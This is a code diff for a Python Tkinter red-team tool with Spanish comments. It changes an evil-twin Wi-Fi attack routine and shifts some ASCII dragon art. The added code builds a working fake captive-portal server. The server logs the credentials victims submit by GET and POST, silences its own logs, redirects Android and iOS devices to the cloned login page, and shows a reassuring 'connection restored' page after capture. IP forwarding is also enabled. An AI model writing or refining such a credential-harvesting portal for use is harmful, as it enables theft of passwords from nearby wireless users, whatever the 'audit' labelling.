@@ -23,11 +23,11 @@ ARTE_DRAGON = """
                                                                                                                                                                     
                                                                                                                                                                     
                                                                                                                                                                     
-                                                                      ▒▒                    ░░░░                                                                    
-                                                                        ░░                  ▒▒                                                                      
-                                                                        ░░░░      ▒▒▓▓      ▒▒░░                                                                    
-                                                                          ▒▒    ▒▒▒▒▒▒▒▒    ▓▓                                                                      
-                                                                          ░░▒▒  ▒▒▒▒▒▒▒▒  ▒▒░░  ░░                                                                  
+                                                                            ▒▒                    ░░░░                                                                    
+                                                                                ░░                  ▒▒                                                                      
+                                                                                ░░░░      ▒▒▓▓      ▒▒░░                                                                    
+                                                                                ▒▒    ▒▒▒▒▒▒▒▒    ▓▓                                                                      
+                                                                                ░░▒▒  ▒▒▒▒▒▒▒▒  ▒▒░░  ░░                                                                  
                                   ░░░░░░░░░░░░░░                              ░░    ▒▒▒▒░░▒▒░░▒▒  ░░▒▒                  ░░░░░░░░░░░░░░░░░░░░░░                      
                       ░░░░▒▒▒▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒░░░░░░░░░░░░░░░░░░        ▒▒    ▒▒████▓▓░░░░░░      ░░░░░░░░░░░░░░░░▒▒▓▓▓▓▒▒▒▒▓▓▒▒▒▒▒▒▒▒░░▒▒░░░░░░░░░░░░    
               ░░████▓▓▒▒░░▓▓▒▒▒▒░░▒▒░░░░░░░░▒▒▒▒░░░░▒▒▒▒░░▒▒██▓▓░░▓▓▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▒▒▒▒▒▒░░▓▓░░░░░░░░░░▓▓▒▒▒▒▓▓▒▒░░▒▒░░░░░░▒▒  ░░░░▒▒▒▒░░░░░░▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒░░██▓▓▒▒░░            
@@ -1219,7 +1219,9 @@ class RedTeamApp(tk.Tk):
 
     def _evil_twin_ejecutar(self, red, portal, deauth_mode, cliente_mac=None):
         timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
-        session_dir = os.path.join(BASE_DIR_EVIL, f"Auditoria-{timestamp}")
+        
+        # FIX CRÍTICO: Convertir a ruta absoluta para que sobreviva al os.chdir() del servidor web
+        session_dir = os.path.abspath(os.path.join(BASE_DIR_EVIL, f"Auditoria-{timestamp}"))
         os.makedirs(session_dir, exist_ok=True)
 
         self.limpiar_main_frame()
@@ -1255,33 +1257,74 @@ class RedTeamApp(tk.Tk):
             subprocess.run(["cp", "-r", f"{portals_dir}/{portal}/.", tmp_web], stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL)
 
+            # Como session_dir es absoluta, cred_log también lo será (Ej: /home/pi/Resultados_...)
             cred_log = os.path.join(session_dir, "credentials.log")
+            
             capture_script = f'''#!/usr/bin/env python3
 import http.server, urllib.parse, os, socketserver
 from datetime import datetime
+
 LOG = "{cred_log}"
 
-class Handler(http.server.SimpleHTTPRequestHandler):
+class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
-        if self.path == "/" or self.path == "/index.html": self.path = "/index.html"
+        parsed_path = urllib.parse.urlparse(self.path)
+        
+        # Captura por GET por si acaso
+        if parsed_path.query:
+            params = urllib.parse.parse_qs(parsed_path.query)
+            try:
+                with open(LOG, "a") as f: 
+                    f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} DATA_GET:{{params}}\\n")
+                    f.flush()
+                    os.fsync(f.fileno())
+            except Exception as e:
+                pass # Evita crashear el servidor si hay error de escritura
+
+        # Lógica de Redirección para Portales Cautivos (Android/iOS)
+        local_path = self.translate_path(parsed_path.path)
+        if not os.path.isfile(local_path) or parsed_path.path == "/":
+            self.send_response(302)
+            self.send_header("Location", "http://10.0.0.1/index.html")
+            self.end_headers()
+            return
+            
         return http.server.SimpleHTTPRequestHandler.do_GET(self)
+
     def do_POST(self):
         length = int(self.headers.get("Content-Length", 0))
-        data = self.rfile.read(length).decode()
+        data = self.rfile.read(length).decode("utf-8", "ignore")
         params = urllib.parse.parse_qs(data)
-        with open(LOG, "a") as f: f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} Data:{{params}}\\n")
-        self.send_response(302); self.send_header("Location", "/success.html"); self.end_headers()
-    def log_message(self, format, *args): pass
+        
+        # Guardado de credenciales con manejo de errores
+        try:
+            with open(LOG, "a") as f: 
+                f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} CREDENCIALES:{{params}}\\n")
+                f.flush() 
+                os.fsync(f.fileno())
+        except Exception as e:
+            pass
+            
+        # Redirección de éxito
+        self.send_response(302)
+        self.send_header("Location", "http://10.0.0.1/success.html")
+        self.end_headers()
+        
+    def log_message(self, format, *args): 
+        pass # Silenciar logs
 
 if __name__ == "__main__":
     os.chdir("{tmp_web}")
-    with socketserver.TCPServer(("0.0.0.0", 80), Handler) as httpd: httpd.serve_forever()
+    with socketserver.TCPServer(("0.0.0.0", 80), CaptivePortalHandler) as httpd: 
+        httpd.serve_forever()
 '''
             with open(f"{tmp_web}/capture.py", "w") as f:
                 f.write(capture_script)
+                
+            # success.html adaptado para que coincida un poco con los colores de tu portal
             if not os.path.exists(f"{tmp_web}/success.html"):
                 with open(f"{tmp_web}/success.html", "w") as f:
-                    f.write('<html><body><h2>OK</h2></body></html>')
+                    f.write('<html><body style="background:#0b1a2a;color:#fff;text-align:center;font-family:-apple-system, BlinkMacSystemFont, sans-serif;margin-top:20vh;"><h2>Conexión Restablecida</h2><p style="color:#b0c7db;">Ya puede cerrar esta ventana y navegar normalmente.</p></body></html>')
 
             subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL)
